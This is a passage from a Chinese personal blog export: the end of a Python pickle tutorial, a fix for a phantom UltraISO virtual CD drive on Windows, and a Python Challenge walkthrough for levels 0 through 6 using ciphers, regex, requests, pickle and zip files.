<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pickle使用的文件/after.p&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    pickle.dump(tar, f)</span><br></pre></td></tr></table></figure></p>
<h2 id="dumps">dumps</h2>
<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, protocol=<span class="literal">None</span>, *, fiximports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
<p>参数： - obj：要序列化的对象 - 少了 file</p>
<ul>
<li>返回值 <strong>直接返回序列化后的二进制对象。（这是与 dump 最大的区别）</strong></li>
</ul>
<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(tar))</span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00&#125;\x94(\x8c\x04name\x94\x8c\x05lihua\x94\x8c\x03age\x94K\x1eu.&#x27;</span><br></pre></td></tr></table></figure></p>
<h2 id="load">load</h2>
<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.load(file, *, protocol=<span class="literal">None</span>, fiximports=<span class="literal">True</span>, encoding=<span class="string">&#x27;ASCII&#x27;</span>, errors=<span class="string">&#x27;strict&#x27;</span>, buffers=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
<p>参数： - file：要反序列的<strong>二进制文件</strong></p>
<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pickle使用的文件/after.p&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    <span class="built_in">print</span>(pickle.load(f))</span><br></pre></td></tr></table></figure></p>
<p>利用上面的 dump 的序列化后的二进制文件做演示，得到结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;: &#x27;lihua&#x27;, &#x27;age&#x27;: 30&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="loads">loads</h2>
<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.loads(data, /, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&quot;ASCII&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>, buffers=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
<p>参数： - data：需要反序列化的<strong>二进制对象</strong></p>
<p>返回值： <strong>直接返回反序列化后的对象。（这是与 load 的最大区别）</strong></p>
<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;</span><br><span class="line">tars = pickle.dumps(tar)  <span class="comment"># 先序列化</span></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(tars)) <span class="comment"># 再反序列化</span></span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;: &#x27;lihua&#x27;, &#x27;age&#x27;: 30&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pickle</tag>
      </tags>
  </entry>
  <entry>
    <title>windows 上CD驱动器的删除问题</title>
    <url>/2022/03/28/windows%20%E4%B8%8ACD%E9%A9%B1%E5%8A%A8%E5%99%A8%E7%9A%84%E5%88%A0%E9%99%A4%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>个人日常生活中遇到的繁琐的小问题的解决。</p>
<span id="more"></span>
<h1 id="问题描述">问题描述</h1>
<p>有时候，电脑上总会莫名其妙的安装了如下 CD驱动器：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224202.png" /></p>
<p>删除也删不掉，打开也打开不了，很烦。</p>
<h1 id="原因">原因</h1>
<p>CD驱动器计算机-设备和驱动器分类下的计算机光驱管理，可加载ISO文件，多在计算机安装<code>UltraISO</code>软碟通等虚拟光驱软件后自动在我的电脑下创建CD驱动器图标。</p>
<p>知道原因后，解决的办法就很简单了。</p>
<h1 id="问题解决">问题解决</h1>
<p>首先，以管理员方式打开 <code>UltraISO</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224452.png" /></p>
<p><code>选项 -&gt; 配置</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224557.png" /></p>
<p>然后 <code>虚拟光驱</code>，<strong>将设备数量改为无</strong></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224629.png" /></p>
<p>然后即可看到 CD驱动器已经消失了。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224711.png" /></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows小知识</tag>
      </tags>
  </entry>
  <entry>
    <title>python challenge 题解</title>
    <url>/2022/01/29/python%20challenge%20%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>这是个人的 python challenge 的刷题记录，网址是：<a href="http://www.pythonchallenge.com/">python challenge</a>。更多内容请点击 <strong>阅读全文</strong>，如有错误，欢迎在评论区指出。</p>
<span id="more"></span>
<h1 id="level-0">level 0</h1>
<h2 id="题目信息">题目信息</h2>
<p>题目信息如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220129214059.png" /></p>
<p>提示：修改 url 的值，并且画面中为 <span class="math inline">\(2^{38}\)</span>，当前 url 为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.pythonchallenge.com/pc/def/0.html</span><br></pre></td></tr></table></figure></p>
<h2 id="方法">方法</h2>
<p>代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = <span class="number">2</span> ** <span class="number">38</span></span><br><span class="line"><span class="built_in">print</span>(res) <span class="comment"># 274877906944</span></span><br></pre></td></tr></table></figure></p>
<p>将 url 中的 0 用 274877906944 代替即可。</p>
<h1 id="level-1">level 1</h1>
<h2 id="题目信息-1">题目信息</h2>
<p>题目信息如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220129215240.png" /></p>
<p>根据图片应该是某种加密方法，图中的 <code>K-&gt;M, O-&gt;Q, E-&gt;G</code>，正好符合规律：<strong>K往后两个字母就是M，O往后两个字母就是Q，E往后两个字母就是G</strong>。猜测只要把下面粉色的字母全部用自己的后两个字母代替即可。</p>
<h2 id="方法-1">方法 1</h2>
<p>代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">encypt_str = <span class="string">&quot;g fmnc wms bgblr rpylqjyrc gr zw fylb. rfyrq ufyr amknsrcpq ypc dmp. bmgle gr gl zw fylb gq glcddgagclr ylb rfyr&#x27;q ufw rfgq rcvr gq qm jmle. sqgle qrpgle.kyicrpylq() gq pcamkkclbcb. lmu ynnjw ml rfc spj. &quot;</span> <span class="comment"># 原来的字符串  </span></span><br><span class="line">  </span><br><span class="line">shift = <span class="number">2</span> <span class="comment"># 后移步数  </span></span><br><span class="line">new_str = <span class="string">&quot;&quot;</span> <span class="comment"># 新的字符串  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> encypt_str:  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>.isalpha(ch): <span class="comment"># 判断是否是字母  </span></span><br><span class="line">        ch = <span class="built_in">ord</span>(ch)</span><br><span class="line">        ch = ((ch + shift) - <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span> <span class="comment">#  y 和 z 变成 a 和 b</span></span><br><span class="line">        ch = <span class="built_in">chr</span>(ch)  </span><br><span class="line">    new_str += ch  </span><br><span class="line"><span class="built_in">print</span>(new_str)</span><br></pre></td></tr></table></figure> （需要注意的是 y 和 z 变成 a 和 b 的时候！！！）</p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i hope you didnt translate it by hand. thats what computers are for. doing it in by hand is inefficient and that&#x27;s why this text is so long. using string.maketrans() is recommended. now apply on the url.</span><br></pre></td></tr></table></figure></p>
<p>发现除了提示我们可以使用 maketrans() 方法之外，没有其他信息。我们回到 url <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.pythonchallenge.com/pc/def/map.html</span><br></pre></td></tr></table></figure></p>
<p>根据本题的加密方法，将 <code>map -&gt; ocr</code> 即可跳转下一关。 （其实，连代码都没必要写！！！）</p>
<h2 id="方法-2">方法 2</h2>
<h3 id="maketrans-方法介绍">maketrans() 方法介绍</h3>
<blockquote>
<p>Python maketrans() 方法用于创建字符映射的转换表，对于接受两个参数的最简单的调用方式，第一个参数是字符串，表示需要转换的字符，第二个参数也是字符串表示转换的目标。 <strong>注：</strong>两个字符串的长度必须相同，为一一对应的关系。python 3 和 python 2 的使用方法不同，2 需要导入 string，而 3 不需要。</p>
</blockquote>
<ul>
<li><p>语法： <code>str.maketrans(intab, outtab)</code></p></li>
<li><p>参数：</p>
<ul>
<li>intab：字符串中要替代的字符组成的字符串。</li>
<li>outab：与 intab 一一对应的映射字符的字符串。</li>
</ul></li>
<li><p>返回值： 返回字符串转换后生成的新字符串。</p></li>
<li><p>一般配合 translate() 使用</p></li>
</ul>
<h3 id="translate-方法介绍">translate() 方法介绍</h3>
<blockquote>
<p>Python translate() 方法根据参数table给出的表(包含 256 个字符)转换字符串的字符, 要过滤掉的字符放到 del 参数中。</p>
</blockquote>
<ul>
<li><p>语法： <code>str.translate(table[, deletechars]);</code></p></li>
<li><p>参数：</p>
<ul>
<li>table：翻译表，翻译表是通过maketrans方法转换而来。</li>
<li>deletechars：字符串中要过滤的字符列表。</li>
</ul></li>
<li><p>返回值： 返回翻译后的字符串。</p></li>
<li><p>本题演示： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">encypt_str = <span class="string">&quot;g fmnc wms bgblr rpylqjyrc gr zw fylb. rfyrq ufyr amknsrcpq ypc dmp. bmgle gr gl zw fylb gq glcddgagclr ylb rfyr&#x27;q ufw rfgq rcvr gq qm jmle. sqgle qrpgle.kyicrpylq() gq pcamkkclbcb. lmu ynnjw ml rfc spj. &quot;</span></span><br><span class="line"></span><br><span class="line">intab = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>  </span><br><span class="line">outtab = <span class="string">&quot;cdefghijklmnopqrstuvwxyzab&quot;</span>  </span><br><span class="line">trantab = encypt_str.maketrans(intab, outtab)  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(encypt_str.translate(trantab))</span><br></pre></td></tr></table></figure></p></li>
</ul>
<h2 id="方法-3">方法 3</h2>
<h3 id="zip-方法介绍">zip() 方法介绍</h3>
<blockquote>
<p><strong>zip()</strong> 函数用于将可迭代的对象作为参数，将对象中 <strong>对应的元素</strong> 打包成一个个元组，然后返回由这些元组组成的对象，这样做的好处是节约了不少的内存。 我们可以使用 list() 转换来输出列表。也可以用 dict() 转换为字典，此时就产生了映射关系。 如果各个迭代器的元素个数不一致，则返回列表长度与最短的对象相同，利用 * 号操作符，可以将元组解压为列表。</p>
</blockquote>
<ul>
<li><p>语法： <code>zip([iterable, ...])</code></p></li>
<li><p>参数：</p>
<ul>
<li>iterabl：一个或多个迭代器</li>
</ul></li>
<li><p>返回值： 返回一个对象。</p></li>
<li><p>解压： <code>zip(*被压缩的对象)</code>，返回二维矩阵式</p></li>
<li><p>本题演示： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">encypt_str = <span class="string">&quot;g fmnc wms bgblr rpylqjyrc gr zw fylb. rfyrq ufyr amknsrcpq ypc dmp. bmgle gr gl zw fylb gq glcddgagclr ylb rfyr&#x27;q ufw rfgq rcvr gq qm jmle. sqgle qrpgle.kyicrpylq() gq pcamkkclbcb. lmu ynnjw ml rfc spj. &quot;</span> <span class="comment"># 原来的字符串</span></span><br><span class="line"></span><br><span class="line">intab = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz,. &#x27;()&quot;</span>  </span><br><span class="line">outtab = <span class="string">&quot;cdefghijklmnopqrstuvwxyzab,. &#x27;()&quot;</span>  </span><br><span class="line">transtab = <span class="built_in">dict</span>(<span class="built_in">zip</span>(intab, outtab))  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(transtab[x] <span class="keyword">for</span> x <span class="keyword">in</span> encypt_str))</span><br></pre></td></tr></table></figure></p></li>
</ul>
<h1 id="level-2">level 2</h1>
<h2 id="题目信息-2">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130103607.png" /></p>
<p>注意红色字符串，要我们从图片中的书里或者页面源码中找字符。首先，书里根本看不清，所以只能从页面源码中找，打开页面源码，往下滑动，发现确实有，但是内容很多，需要写脚本。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130103757.png" /></p>
<h2 id="方法-4">方法</h2>
<p><strong>步骤：</strong></p>
<ol type="1">
<li><p>请求网址，获得页面源码</p></li>
<li><p>拿到这串字符串</p></li>
<li><p>从中找出字母</p></li>
</ol>
<p><strong>代码：</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> re  </span><br><span class="line">url = <span class="string">&quot;http://www.pythonchallenge.com/pc/def/ocr.html&quot;</span>  </span><br><span class="line">r = requests.get(url)  </span><br><span class="line">tar = re.findall(<span class="string">r&#x27;&lt;!--(.*?)--&gt;&#x27;</span>, r.text, flags=re.S)[<span class="number">1</span>]  <span class="comment"># 找到一大串字符串</span></span><br><span class="line">ch_lst = re.findall(<span class="string">r&#x27;[a-zA-Z0-9]+&#x27;</span>, tar)  <span class="comment"># 拿到字符串中的字符</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(ch <span class="keyword">for</span> ch <span class="keyword">in</span> ch_lst)) <span class="comment"># 拼接成 url</span></span><br></pre></td></tr></table></figure></p>
<p><strong>结果：</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">equality</span><br></pre></td></tr></table></figure></p>
<p>修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/def/ocr.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/def/equality.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-3">level 3</h1>
<h2 id="题目信息-3">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130142422.png" /></p>
<p>除了一句提示，什么都没有。查看页面源码，发现字符串： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130142748.png" /></p>
<p>根据提示做出合理猜测：<strong>找出这一字符串中的小写字母，每个小写字母的前后都是三个大写字母！！！也就是 AAAbCCC 类型的</strong></p>
<h2 id="方法-5">方法</h2>
<p><strong>步骤：</strong></p>
<ol type="1">
<li>请求网址，拿到页面源码</li>
<li>取出这一大串字符串</li>
<li>从中找出符合条件的小写字母</li>
</ol>
<p><strong>代码：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re  </span><br><span class="line">url = <span class="string">&#x27;http://www.pythonchallenge.com/pc/def/equality.html&#x27;</span>  </span><br><span class="line">r = requests.get(url)  </span><br><span class="line">tar = re.findall(<span class="string">r&#x27;&lt;!--(.*?)--&gt;&#x27;</span>, r.text, flags = re.S)[-<span class="number">1</span>] <span class="comment"># 取出目标字符串  </span></span><br><span class="line">ch_lst = re.findall(<span class="string">r&#x27;[^A-Z]+[A-Z]&#123;3&#125;([a-z])[A-Z]&#123;3&#125;[^A-Z]+&#x27;</span>, tar, re.S)    <span class="comment"># 从目标字符串中取出符合条件的小写字母  </span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(ch <span class="keyword">for</span> ch <span class="keyword">in</span> ch_lst)) <span class="comment"># 拼接成 url</span></span><br></pre></td></tr></table></figure>
<p><strong>解释：</strong> 主要说明一下取出符合条件的小写字母的模式是如何而来的。</p>
<p><code>[a-z]</code> 表示一个小写字母；</p>
<p><code>[A-Z]</code> 表示一个大写字母；</p>
<p><code>[A-Z]&#123;3&#125;</code> 表示三个大写字母；</p>
<p><code>[A-Z]&#123;3&#125;[a-z][A-Z]&#123;3&#125;</code> 表示 ...AAAbCCC... 类型的，注意 ... 可能为大写，比如说：AAAAbCCC 也是会被匹配到的，但是，题目要求的小写字母是前后严格只有三个大写字母，所以还需要补上 <code>[^A-Z]</code> ，这表示非大写字母</p>
<p>总的模式就是：<code>[^A-Z]+[A-Z]&#123;3&#125;([a-z])[A-Z]&#123;3&#125;[^A-Z]+</code>，这个 <code>+</code> 写不写无所谓，就本题而言，主要是 <code>aAAAbCCCc</code> 的都行，无所谓前后是大写还是小写。</p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">linkedlist</span><br></pre></td></tr></table></figure></p>
<p>修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/def/equality.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/def/linkedlist.html</span><br></pre></td></tr></table></figure></p>
<p>访问修改后的 url 得到提示 <code>linkedlist.php</code> ，访问<code>http://www.pythonchallenge.com/pc/def/linkedlist.php</code> 即可。</p>
<h1 id="level-4">level 4</h1>
<h2 id="题目信息-4">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130194001.png" /></p>
<p>页面源码： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130194018.png" /></p>
<p>点击图片发现可以跳转： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130194032.png" /></p>
<p>注意 url 中的 nothing，应该是通过不停的获得 nothing 然后跳转到下一个页面，最后某个页面会出来答案。手动几次后发现确实如此： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130194143.png" /></p>
<p><strong>注意：本题深坑</strong></p>
<h2 id="方法-6">方法</h2>
<p><strong>代码：</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re  </span><br><span class="line">nothing = <span class="number">12345</span>  </span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;http://www.pythonchallenge.com/pc/def/linkedlist.php?nothing=%d&#x27;</span>  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):  </span><br><span class="line">    url = <span class="built_in">str</span> % nothing  </span><br><span class="line">    r = requests.get(url)  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        nothing = <span class="built_in">int</span>(re.findall(<span class="string">r&#x27;\d+&#x27;</span>, r.text)[-<span class="number">1</span>])  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;nothing: %d&quot;</span> % nothing)  </span><br><span class="line">    <span class="keyword">except</span>:  </span><br><span class="line">        nothing /= <span class="number">2</span>  </span><br><span class="line">	<span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></p>
<p><strong>解释：</strong> 首先例举一下这题我遇到的坑！</p>
<p>原先我的代码是这样的： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re  </span><br><span class="line">nothing = <span class="number">12345</span>  </span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;http://www.pythonchallenge.com/pc/def/linkedlist.php?nothing=%d&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):  </span><br><span class="line">    url = <span class="built_in">str</span> % nothing</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    nothing = <span class="built_in">int</span>(re.search(<span class="string">r&#x27;\d+&#x27;</span>, r.text).group())</span><br></pre></td></tr></table></figure></p>
<p>运行一段时间后，得到如下报错： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AttributeError: &#x27;NoneType&#x27; object has no attribute &#x27;group&#x27;</span><br></pre></td></tr></table></figure></p>
<p>并且此时页面的内容为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Yes. Divide by two and keep going.</span><br></pre></td></tr></table></figure></p>
<p>因为此时页面并没有数字，无法匹配，也就没有返回匹配对象，更加没有 group() 方法，所以报错。因此，我将代码修改为如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re  </span><br><span class="line">nothing = <span class="number">12345</span>  </span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;http://www.pythonchallenge.com/pc/def/linkedlist.php?nothing=%d&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):  </span><br><span class="line">    url = <span class="built_in">str</span> % nothing  </span><br><span class="line">    r = requests.get(url)  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        nothing = <span class="built_in">int</span>(re.search(<span class="string">r&#x27;\d+&#x27;</span>, r.text).group())  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;nothing: %d&quot;</span> % nothing)  </span><br><span class="line">    <span class="keyword">except</span>:  </span><br><span class="line">        nothing /= <span class="number">2</span></span><br><span class="line">		<span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></p>
<p>然后能够越过这个坑： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130195351.png" /></p>
<p>跳进下一个坑： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130195449.png" /></p>
<p>当 nothing = 82683 时，页面内容如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You&#x27;ve been misleaded to here. Go to previous one and check.</span><br></pre></td></tr></table></figure></p>
<p>前一个是 82682，页面内容如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">There maybe misleading numbers in the text. One example is 82683. Look only for the next nothing and the next nothing is 63579</span><br></pre></td></tr></table></figure></p>
<p>因为 re.search() 匹配到第一个就会返回，所以才会踩到这个坑，这里的 nothing 是第二个，所以修改为最终代码，就是刚刚给的，最后顺利得到结果： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130200232.png" /></p>
<p>这里其实存在着另一个坑，得到 peak.html 的 nothing = 66831，此时如果你没有显示每一页的内容 <code>print(r.text)</code>，极容易错过信息，因为此时 nothing /= 2，也能访问，看后面能够继续就知道了。</p>
<p>修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/def/linkedlist.php</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/def/peak.html</span><br></pre></td></tr></table></figure></p>
<p><strong>注意：</strong> 遇到坑之后的 nothing 不要从头开始，这样会省时间。</p>
<h1 id="level-5">level 5</h1>
<h2 id="题目信息-5">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130205619.png" /></p>
<p>页面源码： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130205643.png" /></p>
<p>注意绿字提醒：python 中有一个库叫做 pickle，用来序列化和非序列化的。因此，本题需要使用到该库。还有 <code>banner.p</code> 点进去发现是看不懂的一堆字符串，做一个合理的猜测：<strong><code>banner.p</code> 中的字符串是经过序列化的，将它反序列应该会得到答案</strong></p>
<h2 id="方法-7">方法</h2>
<p><strong>代码：</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, pickle  </span><br><span class="line">url = <span class="string">&#x27;http://www.pythonchallenge.com/pc/def/banner.p&#x27;</span>  </span><br><span class="line">raw = requests.get(url).content  </span><br><span class="line"><span class="built_in">print</span>(pickle.loads(raw))</span><br></pre></td></tr></table></figure></p>
<p>发现得到看不懂的一堆东西： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130210254.png" /></p>
<p>仔细观察发现，是一个二元列表，每一行都是由一个或多个元组组成的，猜测（看完答案后）：<strong>每一行其实都是字符串的压缩：将一行字符串压缩成 <code>[(字符1，出现次数), (字符2，出现次数)...]</code> 因此，只要将每一行还原成原来的样子即可。</strong></p>
<p><strong>最终代码：</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, pickle  </span><br><span class="line">url = <span class="string">&#x27;http://www.pythonchallenge.com/pc/def/banner.p&#x27;</span>  </span><br><span class="line">raw = requests.get(url).content  <span class="comment"># 转为 byte，因为 loads() 的参数是 byte 类型的</span></span><br><span class="line">data = pickle.loads(raw)  </span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([ch * num <span class="keyword">for</span> ch, num <span class="keyword">in</span> line]))</span><br></pre></td></tr></table></figure></p>
<p><strong>结果：</strong> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130210708.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">channel</span><br></pre></td></tr></table></figure>
<p>修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/def/peak.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/def/channel.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-6">level 6</h1>
<h2 id="题目信息-6">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220131103728.png" /></p>
<p>查看页面源码： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220131103745.png" /></p>
<p>注意：html 旁边的 <code>&lt;!-- &lt;-- zip --&gt;</code>。尝试将 html 修改为 zip 发现可以下载一个压缩文件。</p>
<p>压缩文包里有许多文件，先看 <code>readme.txt</code>： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">welcome to my zipped list.  </span><br><span class="line">  </span><br><span class="line">hint1: start from 90052  </span><br><span class="line">hint2: answer is inside the zip</span><br></pre></td></tr></table></figure></p>
<p>查看之后猜测，除 <code>readme.txt</code> 之外每一个文件内容都是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Next nothing is (\d+)</span><br></pre></td></tr></table></figure></p>
<p>思路：<strong>nothing 从 90052 开始，先访问对应文件，然后读取下一个 nothing 继续访问。直到出现不同</strong></p>
<h2 id="方法-8">方法</h2>
<p>第一次代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re  </span><br><span class="line">rpath = <span class="string">&quot;attachments/level_6/%s.txt&quot;</span>  </span><br><span class="line">nothing = <span class="string">&quot;90052&quot;</span>  </span><br><span class="line">pattern = <span class="string">&quot;Next nothing is (\d+)&quot;</span>  </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">    path = rpath % nothing  </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">        content = f.read()  </span><br><span class="line">        <span class="built_in">print</span>(content)  </span><br><span class="line">        match = re.search(pattern, content)  </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> match:  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">	nothing = match.group(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
<p>解释： <code>match.group(1)</code>：因为代码中的 pattern 里面只有一个括号（在我们需要处加上括号），这样子匹配下来的其实是一整句话 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Next nothing is (\d+)</span><br></pre></td></tr></table></figure></p>
<p>但是，我们只需要 () ，如果直接使用 <code>match.group()</code> 就会将整句话给 nothing，而 <code>group(1)</code> 就是只读取第一个括号中的内容，也就是 () 即 nothing。</p>
<p>不出所料，果然没这么简单，当 nothing = 46145 时： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220131105144.png" /></p>
<p>现在的问题是什么是 comments？经过百度后发现 zip 文件有 comment，用来写额外的描述数据。python 中有 zipfile 库可以获得 comment。</p>
